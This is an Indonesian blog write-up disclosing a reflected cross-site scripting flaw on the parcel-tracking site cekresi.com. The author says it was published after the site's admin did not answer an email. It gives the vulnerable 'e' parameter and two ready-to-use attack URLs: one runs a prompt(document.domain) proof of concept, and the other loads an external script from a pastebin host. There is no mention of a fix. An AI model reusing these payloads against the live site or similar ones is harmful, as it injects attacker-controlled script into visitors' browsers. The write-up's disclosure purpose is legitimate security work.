---
title: "XSS on Cekresi.com"
author: "Tan My ID"
tags: ["Web", "WriteUp", "XSS"]
date: 2019-07-24T06:13:55+07:00
draft: false
---

Hai lur, kali ini sedikit tulisan tentang salah satu bug yang saya temukan pada website [CekResi.com](https://cekresi.com/) ya karena ndak ada balasan email dari dari admin web tersebut, ya udah ku **write up** aja daripada ku simpan sendiri hehe.

{{< figure src="https://cekresi.com/images/cek-resi-logo.png" alt="cekresi.com">}}
CekResi.com sendiri adalah website yang populer untuk melakukan tracking barang yang dikirim atau diterima lewat nomer RESI yang di berikan dari kantor pemaketan.

Awal aku menemukan bug ini ketika disuruh atasanku mengecek resi pengiriman dokumen ke kantor pusat tempat aku bekerja, nah aku inget ada website [CekResi.com](https://cekresi.com/) untuk sekedar mentracking barang sudah sampai mana. Nah kumasukkan nomer resinya dan mengetahui bahwa paket sudah sampai ke Jakarta. Aku ingat disana ada form input nomer resi, ku coba isi dengan payload XSS sederhana, namun gagal.

Tidak berhenti di situ, saya mencoba menginstall firefox quantum dan hackbar quantum, kebetulan di sana ada **auto input parameter** dengan script XSS. Dan ternyata aku menemukan sebuah parameter dimana bisa di masukkan payload XSS.

Parameter yang ku temukan seperti berikut **https://cekresi.com/m/index?viewstate=&e=&noresi=** pada parameter `e=` disitu saya menyisipkan payload XSS sederhanya **&quot;&gt;&lt;script&gt;prompt(document.domain);&lt;/script&gt;** untuk memunculkan nama domain dari website **cekresi.com** sehingga url nya menjadi seperti ini :
```
https://cekresi.com/m/index?viewstate=&e="><script>prompt(document.domain);</script>&noresi=TAN
```
Berikut penampakannya :
{{< figure src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi.png" alt="XSS ">}}

Tak sampai disitu, saya juga mencoba untuk menggunakan script html dalam XSS kali ini dan ternyata berhasil. Berikut payloadnya :
```
https://cekresi.com/m/index?viewstate=&e="><script src=https://pastebin.com/raw/mUBsAPXz/></script>&noresi=TAN
```
Berikut penampakannya :
{{< figure src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi-2.png" alt="XSS ">}}

Eh iya lupa, ini hanya berlaku pada browser mozilla firefox ya, kalian pasti sudah tau alasannya dong. Nah semoga bermanfaat bagi kalian. Terima Kasih.
